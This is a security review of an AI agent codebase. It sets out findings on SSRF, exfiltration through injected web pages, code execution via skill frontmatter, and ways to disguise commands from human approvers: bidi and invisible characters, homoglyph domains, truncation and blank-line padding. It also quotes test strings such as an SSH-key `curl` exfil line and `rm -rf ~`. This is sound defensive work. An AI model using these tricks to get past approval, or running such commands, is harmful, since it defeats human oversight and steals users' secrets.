# OpenAgent — Independent Review (Wave 3, audit + verify)

Reviewer modes: **audit** (HEAD `59b37da`, A01–A24 plus a security hunt beyond
that list), then **verify** (uncommitted working tree on top of `59b37da`: new
A25, `src/tools/net-guard.ts`, and fixes for H1/H2/M2/M3). Reviewer may edit
only `test/**` and this file.

## Verify round 4 (latest)

Scope: REVIEW-M14 and REVIEW-L16, plus the source cleanup that turned raw
invisible characters in our own code into ASCII escapes. The changes under
review, all uncommitted:
- `src/slack.ts`: `HIDDEN_CHARS` adds `\p{Default_Ignorable_Code_Point}` and a literal `⟨` (tokenised, not counted); `TOKEN_OR_CHAR` is bounded to `{4,6}`; the ZWSP at `:124` is now `'\u200B'`.
- `src/skills.ts:288`, `:309`: the BOM in both regexes is now `\uFEFF`.
- `docs/AMENDMENTS.md`: two new lines at the end of the A26 "faithful" bullet.

| Check | Result |
|---|---|
| `npx tsc --noEmit` | **0 errors** |
| `npx vitest run` (new source, before my test edits) | 2 failed: the M14 and L16 `it.fails`, which now fail because both fixes work. |
| `npx vitest run` (after) | **263 passed / 0 failed / 2 expected-fail (REVIEW-M15, L17 evidence, `it.fails`) / 13 skipped / 1 todo** (279 total, 19 files passed, 2 skipped) |
| Live LLM calls, Slack API calls, Docker commands | **0** |

**Open Critical/High: none.** Still open: REVIEW-M15 (Medium), REVIEW-L17 (Low).

| ID | Verdict | Evidence |
|---|---|---|
| REVIEW-M14 | **Fixed** | `test/review-slack.test.ts` "REVIEW-M14 regression" (6 tests). (1) The round-3 giant-hex probe (`rm -rf ~ #⟨U+` + 11,900 × `A` + `⟩`, 11,914 chars) now renders with every section under 3,000. Every section is whole units, the de-escaped text is `…#⟨U+27E8⟩U+AAAA…⟩`, and there is no warning. (2) A typed `⟨U+202E⟩` renders as `⟨U+27E8⟩U+202E⟩` with `count` 0. A real U+202E renders as `⟨U+202E⟩` with `count` 1. Mixed together, the warning counts 1, and every `⟨` in the output opens a real token. That makes the encoding injective, which closes accepted gap (c) from round 3. (3) A lone `⟩` and partial tokens pass through as plain text. (4) Worst case: 12,000 × `⟨` gives **35 blocks** (33 code sections + header + actions, no warning), with every section under 3,000. Mixes of `⟨` with U+202E and with `&`/`<`/`>` stay at or under 36. Note: with `⟨` tokenised, no raw `⟨` can reach the packer, so the `{4,6}` bound is now defence in depth and can't be observed on its own. |
| REVIEW-L16 | **Fixed** | "REVIEW-L16 regression": U+17B4, U+17B5, U+180B–180D and U+180F each become `⟨U+XXXX⟩` with `count` 1. Together, the six in one preview give a warning of 6, and none appears raw anywhere in the blocks. The round-3 full-range scan "every Default_Ignorable code point is revealed" now runs with **no exemptions** and passes. The spec lines in A26 match the code. |
| Source cleanup | **Verified** | New `test/review-source-hygiene.test.ts` scans every file under `src/` and fails on any raw `\p{Cf}`, `\p{Default_Ignorable_Code_Point}`, U+00A0, U+2028 or U+2029. It passes on the working tree. The same pattern run over the **HEAD** copies flags exactly the three characters that were removed: `skills.ts:288` U+FEFF, `skills.ts:309` U+FEFF, `slack.ts:124` U+200B. So the guard would have caught them. The pattern is built from `String.raw` and numeric code points, and the test checks that its own file holds no such characters. (The tool pipeline had decoded `\u00A0\u2028\u2029` in a doc comment into raw characters; I caught it with a byte check and rewrote the line.) A scan of `test/**` and `docs/**` also finds none. |
| skills.ts BOM handling | **Covered** (previously untested) | `test/review-source-hygiene.test.ts`, through the public API: (1) a BOM-prefixed skill file parses its description, schedule, model and body via both `getSkill` and `loadAllSkills`; (2) a BOM + `---js` file is rejected ("must be YAML") and skipped by `loadAllSkills`, and a global marker stays unset, so nothing was evaluated; (3) `assertBodyHasNoFence` rejects BOM + `---`, BOM + blank lines + an indented `---`, and BOM + `---js`, but accepts a BOM body whose `---` comes later; (4) `saveSkill` rejects a BOM + `---` body and writes no file. Note: tests (1) and (2) would also pass without the strip at `skills.ts:309`, because gray-matter strips the BOM itself (`lib/utils.js:48`, `strip-bom-string`) and the YAML-only engines refuse `js` anyway. That strip is defence in depth. Tests (3) and (4) do depend on the `\uFEFF?` at `:288`. |

No new findings this round. I probed a lone `⟩`, partial tokens and `⟨` worst-case mixes (above), and none produced a split, an oversized section or a miscount.

## Verify round 3

Scope: REVIEW-M13 only, against the new A26 bullet "Previews are faithful,
too". The fix is the uncommitted change to `src/slack.ts` (`revealHiddenChars`,
`codeSections` unit packing, the warning section in `approvalBlocks`, and
code-point shortening in `decidedBlocks`).

| Check | Result |
|---|---|
| `npx tsc --noEmit` | **0 errors** |
| `npx vitest run` (before my test edits) | 211 passed / **1 failed** (the REVIEW-M13 `it.fails`, which now fails because the fix works) / 13 skipped / 1 todo. This matches the engineer's report. |
| `npx vitest run` (after) | **248 passed / 0 failed / 4 expected-fail (REVIEW-M14, M15, L16, L17 evidence, `it.fails`) / 13 skipped / 1 todo** (266 total) |
| Live LLM calls, Slack API calls, Docker commands | **0** |

**Open Critical/High: none.**

| ID | Verdict | Evidence |
|---|---|---|
| REVIEW-M13 | **Fixed** (follow-ups in M14–L17 below) | `test/review-slack.test.ts`. The M13 `it.fails` is now a plain `it` ("REVIEW-M13 regression"), and 36 new tests cover the A26 bullet. (1) **Tokens:** `revealHiddenChars` maps U+202E, U+200B, U+FEFF, U+00A0, U+2028/2029, U+E0041 (astral tag, one token, not two), U+FE0F, U+E0100, both lone surrogates, CR, NUL, U+2066, U+034F, U+3164 and U+00AD to `⟨U+XXXX⟩` with uppercase hex padded to 4 digits, and `count` is right. `\n`, `\t` and space are untouched. A full scan of U+0000–10FFFF finds every `White_Space` code point revealed, and every `Default_Ignorable_Code_Point` revealed **except six** (REVIEW-L16). `\p{C}` also reveals private-use and unassigned code points, which is stricter than the spec. (2) **Renderer ZWSP:** it is still inserted between adjacent backticks after the substitution, raw and without a token, while a ZWSP from the input becomes `⟨U+200B⟩`. `unescapeForDisplay` still round-trips backticks and escapes exactly for text with no hidden characters, and returns the revealed text when there are hidden ones. (3) **Warning:** it sits at block index 1, directly above the code, with the right count (4 in the test), and the buttons stay. It is absent for plain commands, backticks, escapes, plain emoji and Hebrew text. A literal `⟨U+202E⟩` typed into the input isn't counted. An over-limit preview still gets the no-buttons notice and no warning. (4) **No split:** a token arriving at every offset around the section boundary moves whole to the next section, and an 11k mixed preview (tokens, astral tokens, entities, emoji, backticks, a lone surrogate), tested at 10 alignments, gives sections that are all whole units with no lone surrogate and lose nothing. (5) **Worst case:** 12,000 × U+202E gives **36 blocks, longest section 2,976**, confirming the engineer's figures. 12,000 lone surrogates and 7 hidden/`&`/`<`/`>`/backtick/astral mixes at 8 alignments each stay at or under 36 blocks with every section under 3,000. A hidden BMP character (1 → 8) is the largest expansion per UTF-16 unit, so this is the ceiling, with one exception: REVIEW-M14. (6) **`decidedBlocks`** reveals hidden characters, and with a 2,500-code-point cut that lands on an emoji or an astral tag, it keeps the pair whole (no `⟨U+D83D⟩`/`⟨U+DB40⟩`). **Accepted gaps, not findings:** (a) stacked combining marks (50 × U+0301) are visible as glyph pile-ups and don't reorder text; (b) strong RTL letters (Hebrew, Arabic) can reorder neighbouring digits and punctuation under the bidi algorithm without any control character, but the script itself is visible and the spec deliberately lets RTL text through; (c) a literal `⟨U+XXXX⟩` in the input looks the same as a real token, but nothing reorders and the warning counts only real characters, so a mismatch shows (see the M14 fix for making the encoding injective); (d) `decidedBlocks` has no warning line and shortens without a marker, which A26 permits after a decision; (e) emoji with VS16 or ZWJ trigger the warning, a false positive by design since nothing is auto-denied. |

### New findings (round 3)

| ID | Severity | Amendment | File:line | Finding | Evidence | Suggested fix | Owner |
|---|---|---|---|---|---|---|---|
| REVIEW-M14 | **Medium**, **fixed in round 4** | A26 (sections under 3,000) | `src/slack.ts:142` (`TOKEN_OR_CHAR = /⟨U\+[0-9A-F]{4,}⟩\|[\s\S]/gu`), `:172-179` | `codeSections` re-parses the *revealed text* for tokens, and the hex run has no upper bound. A literal `⟨U+` + thousands of hex digits + `⟩` in the model's arguments becomes one packing unit, and a unit longer than the budget is emitted as one section. A 11,914-char preview (under `APPROVAL_PREVIEW_MAX`, so not auto-denied) gives an **11,912-char section**, which breaks A26's per-section rule. Slack's documented section-text limit is 3,000 chars, so `chat.postMessage` would be rejected (I did not call Slack to confirm). `agent.ts:589-598` then fails the turn with "could not post approval request". It **fails closed**: nothing runs, but the row stays PENDING with no buttons until expiry, and a hostile page can trigger it on purpose. Medium (reliability, invariant), not High: no execution and no data loss. Related: the token encoding isn't injective (accepted gap (c) under M13). | `test/review-slack.test.ts` "REVIEW-M14 evidence" (`it.fails`): asserts every section is under 3,000 for that input; it fails today. Probe: section lengths `[32, 18, 11912]`. | Bound the token to real code points (`[0-9A-F]{4,6}`), or better, have `revealHiddenChars` return the unit list so `codeSections` packs real tokens rather than re-parsing text. Optionally render a literal `⟨` from the input as `⟨U+27E8⟩`, so typed and real tokens can't look alike. As a backstop, hard-split any unit longer than the budget. | integ |
| REVIEW-M15 | **Medium** | A25 / A26 (cross-site approval) | `src/tools/browser.ts:241` (`Target URL: ${target}`, raw); `src/slack.ts:141` | Confusables pass untouched. A cross-site `browser_navigate` to `https://www.gооgle.com/search?q=<data>` (Cyrillic `о`) displays as Google, but `new URL()` (the WHATWG parser that Chromium also uses) resolves it to `www.xn--ggle-55da.com`, a different, registrable host. A25's approval exists so a human can check *where* data goes, and a careful approver can't tell these glyphs apart. No hidden character is involved, so there is no warning. Invisible characters in a hostname aren't a vector: `new URL` drops U+200B/180B/180F and rejects U+202E/17B4, which I probed. Medium, not High: I can't show Slack's rendering (posting is out of bounds), the payload in the query string stays visible, and exploitation needs an attacker-registered look-alike domain plus a hijacked model. | `test/review-slack.test.ts` "REVIEW-M15 evidence" (`it.fails`): the real `browserApprovalPreview` + `approvalBlocks` output contains neither `xn--ggle-55da` nor a warning; it fails today. Probe: `new URL(…).hostname` → `www.xn--ggle-55da.com`. | In the navigate preview, add `Host: ${new URL(target).hostname}` (ASCII/punycode) next to the raw URL, and warn when the hostname has non-ASCII labels. Optionally warn on mixed-script tokens in any preview. | core (browser preview) + integ (warning) |
| REVIEW-L16 | **Low**, **fixed in round 4** | A26 (faithful) | `src/slack.ts:141` `HIDDEN_CHARS`; `docs/AMENDMENTS.md` A26 list | Six `Default_Ignorable_Code_Point`s are nonspacing marks (`Mn`) and fall outside every category the A26 bullet lists: U+17B4, U+17B5 (Khmer inherent vowels) and U+180B–180D, U+180F (Mongolian free variation selectors). They reach Slack raw and render as nothing (`a` + U+17B4 + `b` shows as `ab`), so `./run` + U+180B + `.sh` shows as `./run.sh`. Low: they don't reorder text, they can't spoof a hostname (see M15), and exploiting them needs a look-alike file or command prepared in advance. The bullet's own principle ("invisible … must never reach Slack raw") covers them; its list doesn't. | `test/review-slack.test.ts` "REVIEW-L16 evidence" (`it.fails`) and a full-range scan test that passes for every other default-ignorable code point. | Add `\p{Default_Ignorable_Code_Point}` to `HIDDEN_CHARS`, which subsumes the hand-listed U+034F/115F/1160/3164/FFA0/FE00–FE0F/E0100–E01EF and these six, and say so in the A26 bullet. | integ + Lead (spec) |
| REVIEW-L17 | **Low** | A26 (complete ≠ noticeable) | `src/slack.ts:199-232` `approvalBlocks` | Plain spaces and newlines are rightly not tokenized, but nothing signals size. `echo ok` + 5,000 newlines + `curl -d @$HOME/.ssh/id_ed25519 …` + 5,000 newlines + `echo done` renders as 4 code sections that are nearly all blank. The exfil line sits in the second one, between the opening `echo ok` and the `echo done` right above the buttons. Everything is shown, so a careful approver who scrolls will see it, which makes this Low. It relies on scrolling attention, and I couldn't check whether Slack clients collapse long sections behind "Show more" (that would need a post). | `test/review-slack.test.ts` "REVIEW-L17 evidence" (`it.fails`): no non-code block mentions a line count or a warning; it fails today. | Put the size in the header (e.g. "10,002 lines, 10,055 chars, 4 parts"), and warn when the preview has long runs of blank lines or spaces (e.g. ≥ 20 blank lines or ≥ 200 spaces in a row). | integ |

## Verify round 2

Scope: REVIEW-C10, REVIEW-H11, REVIEW-L12; confirm M2 is complete; re-check
A03/A08/A11/A24/A25 gating end to end now that approval runs through
generateText `toolApproval` (new A26).

| Check | Result |
|---|---|
| `npx tsc --noEmit` | **0 errors** |
| `npx vitest run` | At round 2: 211 passed / 0 failed / 1 expected-fail (REVIEW-M13 evidence, `it.fails`) / 13 skipped / 1 todo. At round 3: 248 passed / 0 failed / 4 expected-fail / 13 skipped / 1 todo. **Current (round 4): 263 passed / 0 failed / 2 expected-fail / 13 skipped / 1 todo**; see Verify round 4. |
| Live LLM calls this round | **0**. The end-to-end checks needed only the mock model; total is still 9 of 25. |

**Open Critical/High: none.**

| ID | Verdict | Evidence |
|---|---|---|
| REVIEW-C10 | **Resolved** | `serializeSkill` now calls `matter.stringify({ content }, data, YAML_ONLY)`. gray-matter parses only when given a string (`index.js:161`), so the body is never parsed, and `assertBodyHasNoFence` rejects bodies that start with a fence. `test/review-findings.test.ts` "REVIEW-C10 regression" uses a benign marker: create, update and reload all leave the marker unset; a `---js` body is rejected with nothing written; update leaves the original file byte-identical; a blank-lines-then-fence body (a smuggled `schedule`) is rejected; a normal body round-trips byte for byte. |
| REVIEW-M2 | **Complete** | Reads (round 1) and writes (C10) now both avoid the eval engine. Every `matter()` call in `src/skills.ts` goes through `parseFrontmatter` (YAML only), and the one `stringify` passes a file object. |
| REVIEW-H11 | **Resolved by A26** | Agent: `approvalPreview` (`agent.ts:347`) returns the full args, and both call sites (`:392` length check, `:587` row) use it. `test/agent.test.ts` "argsPreview is the complete command" (updated per your instruction: it asserted ≤503 chars; it now asserts an exact match including the tail). `review-gating.test.ts` shows the complete bash command and cross-site URL in the posted preview; `review-findings.test.ts` shows the full URL and full browser_type text in browser previews. Over 12k: the call is auto-denied with no row, no `postApprovalRequest`, and the model's next prompt carries the "too long to review" reason. Slack: `review-slack.test.ts` covers a ~9,000-char preview, where every section is under 3,000 and the de-escaped concatenation equals the input exactly. `<https://…\|ok>`, `<!channel>`, `<@U…>` and a triple backtick appear with no raw `<`/`>` and no closing fence. Over 12k gives a notice with no buttons. The worst-case `&` expansion stays within 50 blocks. |
| REVIEW-L12 | **Resolved** | The proxy has a server `'error'` listener (`net-guard.ts:467`) and a 300 s idle timeout on established tunnels (`:431-439`). `isClosed()` is wired, and `browser.ts:59-66,156` recreates the proxy and context when it has closed. 6to4, SIIT and Teredo addresses are decoded (`:121-143`). `review-findings.test.ts` "REVIEW-L12 regression" covers the `isClosed()` lifecycle and one embedded-link-local example per form, plus an ordinary public IPv6 that is still allowed. |

**Gating re-check through `toolApproval`** (`test/review-gating.test.ts`, real
toolset, mock model only). With a function-valued `toolApproval`, the SDK
**does not** read tool-level `needsApproval` (`node_modules/ai/dist/index.js:4019`,
`resolveToolApproval`). `makeToolApproval` (`agent.ts:383`) evaluates it
instead, so every gated tool depends on that wrapper. Verified:

- **A03/A08:** in `always` mode bash pauses with the exact command and nothing runs. In `allowlist` mode `pwd` runs and `ls; touch made.txt` pauses (file not created).
- **A11/A24/A25:** one step announces `browser_type` and then calls cross-site `browser_navigate`, `update_global_memory`, `update_skill`, `create_skill`, `switch_model` (global and skill scope), `schedule_followup` and `revert_skill_change`. All 9 pause, with 9 PENDING rows, `MEMORY.md` unchanged, no skill file and no follow-up. `switch_model` with thread scope runs ungated.
- **A11 control:** without browsing, a memory write runs (no over-gating).
- **A26:** a >12k bash call is auto-denied in-loop; the model receives the reason and replies.

### New finding (round 2)

| ID | Severity | Amendment | File:line | Finding | Evidence | Suggested fix | Owner |
|---|---|---|---|---|---|---|---|
| REVIEW-M13 | **Medium**, **fixed in round 3** (see Verify round 3) | A26 | `src/slack.ts` `codeSections` / `escapeMrkdwn`; `src/agent.ts:347` | The preview is now complete, but not necessarily *faithful*. Unicode bidi controls (e.g. U+202E right-to-left override) and zero-width characters in a command, URL or rule pass to Slack unchanged, so the text a human approves can display differently from what runs (the "Trojan Source" technique). Rated Medium, not High: I can show the characters reach the blocks raw, but I can't show Slack's rendering without posting to the workspace, which is out of bounds. | `test/review-slack.test.ts` "REVIEW-M13 evidence" is an `it.fails`: it asserts a U+202E in a command is made visible, the assertion fails today, so the suite stays green. When it's fixed the test will start failing and should become a plain `it`. | In approval previews, replace bidi controls (U+202A–202E, U+2066–2069, U+200E/200F) and zero-width characters (other than the renderer's own ZWSP) with visible tokens such as `⟨U+202E⟩`, or auto-deny gated calls that contain them, as A26 does for oversized ones. | integ (render) + core (deny option) |

## Verify round 1

| Check | Result |
|---|---|
| `npx tsc --noEmit` | **0 errors** |
| `npx vitest run` | **193 passed / 2 failed / 13 skipped / 1 todo**. The 2 failures are the new evidence tests for REVIEW-C10 and REVIEW-H11 (below); nothing else fails. |
| Live LLM calls this pass | **0** (audit pass used 9; total 9 of 25). A25 now hard-blocks loopback, so a local test page can't be served to the browser, and a live cross-site probe would need a public page I control. I didn't spend the budget. |

### Verdicts

| ID | Verdict | Evidence |
|---|---|---|
| REVIEW-H1 | **Resolved by A25** (with the new REVIEW-H11 gap in the preview it promises) | `test/review-findings.test.ts` "REVIEW-H1 regression": metadata and loopback URLs are refused by `execute` with `/^blocked: private\/metadata address/`, and `needsApproval` is false. A public name that resolves to a private address is refused the same way. Cross-site policy: the first navigate is free, a later navigate to a different host needs approval, and the same host (ignoring `www.`) is free. Extract, click and screenshot stay ungated; `browser_type` stays gated. The proxy listens on 127.0.0.1 only. All pass. |
| REVIEW-H2 | **Resolved** | "REVIEW-H2 regression": `listAvailableModels()` no longer lists `google:gemini-2.5-pro`/`-flash` and still lists `google:gemini-flash-latest` (all three remaining Google IDs were live-verified in the audit pass). README and the `switch_model` description were updated. |
| REVIEW-M2 | **Resolved for the read path; superseded by REVIEW-C10** | "REVIEW-M2 regression": a `---js` skill file is rejected with "must be YAML" and never evaluated (passes). The **write** path is still open: see REVIEW-C10. |
| REVIEW-M3 | **Resolved** | `test/review-m3.test.ts`: with one sibling APPROVED and one PENDING, a new message runs the approved call exactly once and cancels the pending one (`REJECTED`, `system:superseded`). Both outcomes are in history, and the model is told what ran. A late click fails, and a replayed resume runs nothing again. Passes. |

### New findings from verification

| ID | Severity | Amendment | File:line | Finding | Evidence | Suggested fix | Owner |
|---|---|---|---|---|---|---|---|
| REVIEW-C10 | **Critical** | A11 / M2 follow-up | `src/skills.ts:273` `serializeSkill` → `matter.stringify(content, data)` | gray-matter's `stringify(string, …)` first calls `matter(content)` with **default** options, so it runs the unlocked parser on the skill **body**. A model-supplied body (via `create_skill` or `update_skill.body`) that starts with a `---js` fence is evaluated in the agent's root process. `create_skill` needs no approval in a turn without browsing, so model output reaches code execution with no human approval. From there it can reach every secret in the process and `agent.db`. The M2 fix (`parseFrontmatter`) covers reads only. | `test/review-findings.test.ts` "REVIEW-C10" (benign global marker): it asserts `create_skill` was **not** gated (passes), and then that the marker was **not** set, which fails because the marker was set during `saveSkill`. | Never pass the body through gray-matter's parser. Build the file as `---\n${yaml.dump(data)}---\n${body}` with the YAML engine only, or call `matter.stringify({ content: body, data: {} }, data, YAML_ONLY)` with a file object so nothing is re-parsed. Also reject bodies that begin with a `---` fence. | core |
| REVIEW-H11 | **High** | A25 / A03 (approval integrity) | `src/tools/browser.ts:229-230`; `src/agent.ts:341-343` (`ARGS_PREVIEW_MAX = 500`, `agent.ts:62`) | A25 says the cross-site preview "shows the full target URL, so data hidden in the query string is visible". In fact the target is clipped to ~500 chars, and `approvalPreview` clips again to 500. Padding hides the tail of the URL, which is exactly where exfiltrated data would sit. The same 500-char clip applies to every gated tool, so the user also approves bash commands and memory rules whose tail they never saw (the existing `test/agent.test.ts:131` asserts a 2,000-char command's preview is ≤503 chars). | `test/review-findings.test.ts` "REVIEW-H11": a 650-char URL's preview lacks its tail marker (fails). | Show the complete argument. Post it in the approval message (code block, up to Slack's ~3,000-char section limit, with overflow in a snippet or file), or refuse to request approval for an argument too long to display. Keep the 500-char `argsPreview` only as the notification text. | core (+ Lead for the `types.ts` 500-char contract) |
| REVIEW-L12 | **Low** | A25 | `src/tools/net-guard.ts:429-436`, `:410`; `src/tools/browser.ts:56-63` | Proxy robustness: (1) There is no `'error'` listener on the server after `listen`, so an accept error such as EMFILE surfaces as an uncaught exception and `index.ts` exits; this fails closed, as a restart. (2) CONNECT tunnels have no idle timeout once established (`setTimeout(0)`), so sockets live as long as Chromium keeps them. (3) `close()` is never called, but if it were, the cached `egress` promise would point a relaunched Chromium at a dead port, and browsing would fail closed until restart. Informational: 6to4 (`2002::/16`), Teredo (`2001::/32`) and `::ffff:0:0:0/96` aren't listed. These ranges don't reach local addresses without a tunnel interface, so there is no practical exposure in the container. | Code review. | Add `server.on('error', log)`, an idle timeout on established tunnels, and reset `egress` on close; optionally list the transition prefixes for completeness. | core |

### net-guard.ts as new attack surface (code review)

- **Loopback only:** `server.listen(0, '127.0.0.1')` (`net-guard.ts:431`); covered by a regression test.
- **CONNECT and absolute-form:** both parse the target host, vet it with `resolveDestination`, and connect only to the vetted address through `pinnedLookup` (`:351-366`, `:394-406`). Origin-form requests fail `new URL()` and get a 400, so a request can't target the proxy's own `Host`.
- **Host header:** forwarded unchanged, but the TCP destination comes from the vetted URL host, so a forged `Host` can't move the connection.
- **IPv6 literals:** brackets and zone are stripped, and IPv4-mapped/NAT64 forms are unwrapped and re-checked as IPv4 (`:117-130`).
- **DNS rebinding:** each name is resolved once, *every* returned address is vetted, and the socket can only connect to those addresses (`:175-209`, `:310`). Chromium never resolves proxied names itself.
- **Sandbox pivot:** the proxy is unauthenticated on loopback, so the sandbox user can reach it. It only forwards to public destinations, which the sandbox can already reach directly with curl, and it refuses internal ranges. No added capability.
- **Proxy dying mid-turn:** it lives in-process, so it only goes away with the process; Chromium requests then fail (fail closed), and the turn's error path releases the thread lock. See L12 for the remaining robustness gaps.

---

# Audit pass (original, HEAD `59b37da`)

## Gate results

| Check | Command | Result |
|---|---|---|
| Type check | `npx tsc --noEmit` | **0 errors** |
| Unit/integration suite (baseline, before my tests) | `npx vitest run` | **185 passed / 0 failed / 8 skipped (container) / 1 todo** |
| Suite after adding my regression tests | `npx vitest run` | **185 passed / 3 failed (intended, see below) / 13 skipped / 1 todo** |
| A09 first-boot isolation | throwaway container + throwaway volume (below) | **PASS** — `agent.db` 0600 root, sandbox cannot read it, cannot write `MEMORY.md`, can write `workspace/`, cannot list the data dir |
| Container runtime posture | `docker inspect openagent` | single bind mount `./data:/app/data`, `Privileged=false`, no `CapAdd`, no port bindings, `ipc=host`, `init=true` — matches A09/A22 |

The **only** failing tests are the three I added as finding evidence, all in
`test/review-findings.test.ts`:

- `REVIEW-H1 … requires approval (or blocks) navigation to metadata/loopback/private/exfil hosts`
- `REVIEW-H1 … browser_extract_text … is also guarded`
- `REVIEW-M2 … does not eval a \`---js\` skill file`

They assert the *secure* behaviour an amendment implies, so they fail against
HEAD and pass once the finding is fixed. `test/live.providers.test.ts` is gated
by `LIVE_LLM=1` and skipped in a normal run.

### A09 first-boot probe (evidence)

Run in a throwaway container built from `openagent:latest`, with a throwaway
named volume (the running `openagent` container and `./data` were never
touched). Files were created by Node *after* the entrypoint ran, reproducing the
case the 59b37da `umask 077` fix targets:

```
-rw------- 1 root    root   agent.db
-rw------- 1 root    root   MEMORY.md
drwx------ 2 root    root   skills
drwx------ 2 sandbox sandbox workspace
drwx--x--x 5 root    root   .            (data dir: 711)
== sandbox reads agent.db ==   cat: /app/data/agent.db: Permission denied
== sandbox writes MEMORY.md == cannot create /app/data/MEMORY.md: Permission denied
== sandbox writes workspace == WROTE-WORKSPACE
== sandbox lists data dir ==   ls: cannot open directory '/app/data': Permission denied
```

### Live LLM probes (budget: 25 calls max; used **9**)

`.env` loaded only inside `test/live.providers.test.ts`; no key value is printed.
One "reply OK" call per configured provider through `resolveModel()` +
`getRegistry()`, using an ID from `listAvailableModels()`, plus 4 extra Google
IDs to pin remediation. Slack probes were read-only (none posted).

| Model ID (advertised in `listAvailableModels`) | Live result |
|---|---|
| `anthropic:claude-haiku-4-5` | OK |
| `openai:gpt-5.4-nano` | OK |
| `google:gemini-2.5-flash` | **REJECTED 404** — "no longer available to new users … use models/gemini-3.8-flash" |
| `deepseek:deepseek-v4-flash` | OK |
| `xai:grok-4.5` | OK |
| `google:gemini-2.5-pro` (extra probe) | **REJECTED 404** — same message |
| `google:gemini-flash-latest` (extra) | OK |
| `google:gemini-pro-latest` (extra) | OK |
| `google:gemini-3.1-pro-preview` (extra) | OK |

Total live calls this run: **9** (5 provider probes + 4 Google ID probes). No
retries beyond the SDK default; `maxOutputTokens` 200 each.

---

## Amendment coverage (A01–A24)

Implemented: **24** · Partial: **0** · Missing: **0**. Markers (`// Axx`) present
and the behaviour verified by the existing suite and my probes. "Implemented"
below means present and correct; security gaps that sit *on top of* an
implemented amendment are in the findings table.

| ID | Status | File:line (anchor) | Notes |
|---|---|---|---|
| A01 Contracts/ports | Implemented | `src/types.ts:9`; only `src/index.ts:214` imports slack/scheduler | SlackPort has no `update`; see M5. |
| A02 Tools per turn | Implemented | `src/tools/index.ts:441`, `src/agent.ts:443` | ctx closes over thread. |
| A03 Native approval | Implemented | `src/agent.ts:380`, `src/tools/bash.ts:265` | Round-trip proven in `test/agent.test.ts`; live round-trip relied on mock coverage. `needsApproval` is `@deprecated` in ai@7 — see L7. |
| A04 ModelMessage | Implemented | `src/db.ts:12,25` | Stored as `ModelMessage[]`. |
| A05 Thread lock | Implemented | `src/locks.ts:106`, `src/agent.ts:543` | Runner takes lock for every caller. |
| A06 Context budget | Implemented | `src/tools/util.ts:286,349`, `src/agent.ts:230,245` | Head+tail truncation, no orphaned tool pairs. |
| A07 Access control | Implemented | `src/slack.ts:30,323,335,355,393` | isAllowedUser first in every entry. |
| A08 Bash approval modes | Implemented | `src/tools/bash.ts:30`, `src/config.ts:104` | Allowlist + metachar block proven in `test/tools.test.ts`. |
| A09 Sandbox user/perms | Implemented | `src/tools/bash.ts:90`, `docker-entrypoint.sh`, `src/index.ts:248` | First-boot probe above passes. |
| A10 Scrubbed env | Implemented | `src/tools/bash.ts:53` | `extendEnv:false`, PATH/HOME/LANG/TZ only. |
| A11 Guard writes after browsing | Implemented | `src/tools/skills-memory.ts:46`, `schedule-model.ts:281,330`, `agent.ts:440` | Covers memory/skill writes, persistent `switch_model`, `schedule_followup`. |
| A12 Schedule guard | Implemented | `src/skills.ts:289`, `schedule-model.ts:343` | Rejects <15-min cadence. |
| A13 Idempotent/expiring approvals | Implemented | `src/db.ts:372,384`, `src/slack.ts:405`, `src/scheduler.ts:150` | Atomic `WHERE … status='PENDING' AND created_at>?`. |
| A14 Manifest additions | Implemented | `slack-manifest.yaml` | `reactions:write`, messages tab, `interactivity.is_enabled:true`. |
| A15 Dedupe events | Implemented | `src/slack.ts:38,325,345` | Bounded LRU; subtypes skipped. |
| A16 Slack formatting/splitting | Implemented | `src/slack.ts:63,102,216` | markdown block + 3,500-char split. |
| A17 Reaction lifecycle | Implemented | `src/slack.ts:298,308,312` | hourglass → check/x. |
| A18 Time zone | Implemented | `src/config.ts:99`, `src/scheduler.ts:102` | `timezone: tz` passed to Cron. |
| A19 Reloads/overlap | Implemented | `src/scheduler.ts:79,102` | Stops all jobs first; `protect:true`. |
| A20 Follow-ups survive restart | Implemented | `src/db.ts:420`, `src/scheduler.ts:189` | Re-armed on boot; 20-day chained timers. |
| A21 Data git repo | Implemented | `src/skills.ts:334,410`; `.gitignore` entries | `git -C`, `safe.directory`, repo lock, staged paths only. |
| A22 Container | Implemented | `Dockerfile:2` (`v1.65.0-noble` = installed playwright 1.65.0), `docker-compose.yml` | `init`, `ipc:host`, git installed, better-sqlite3 built in image. arm64 build is a human deploy step (not re-run here). |
| A23 `.env.example` | Implemented | `.env.example` | All required keys present. |
| A24 browser_type approval | Implemented | `src/tools/browser.ts:198`, `agent.ts:326` | Always needs approval + origin re-check. In-memory origin map → L4. |

---

## Findings

Owner key (per LEAD.md): **core** = `llm.ts`, `agent.ts`, `skills.ts`, `tools/**`;
**integ** = `slack.ts`, `scheduler.ts`, `doctor.ts`, manifest, Docker, README;
**Lead** = `config.ts`, `db.ts`, `types.ts`, `locks.ts`, `index.ts`, packaging.

| ID | Severity | Amendment | File:line | Finding | Evidence | Suggested fix | Owner |
|---|---|---|---|---|---|---|---|
| REVIEW-H1 | **High** | A24 / A11 (Wave-3 exfil item) | `src/tools/browser.ts:130` `checkUrl`; `:147` `browser_navigate`; `:161` `browser_extract_text` | `checkUrl` rejects only non-http(s) schemes. It allows the cloud metadata endpoint `169.254.169.254`, loopback, RFC1918 and arbitrary external hosts, and `browser_navigate`/`browser_extract_text` carry **no `needsApproval`**. The agent (or injected page instructions — the exact threat A11 exists for) can (a) SSRF Oracle Cloud instance metadata / instance-principal credentials and surface them in Slack, and (b) exfiltrate thread contents through a crafted query string, both with zero approval. A24's own note defers "exfiltration via navigation URLs" to this audit. Approaches **Critical** on the documented Oracle deployment (credential exposure). | `test/review-findings.test.ts` `REVIEW-H1` (two tests, deterministic, fail on HEAD); `docker inspect` confirms `NetworkMode` reaches the host network / metadata. | Block navigation whose resolved host is link-local (169.254.0.0/16, incl. metadata), loopback, or private; resolve DNS and re-check after redirects; optionally require approval for cross-origin navigation that carries a non-empty query/body. | core |
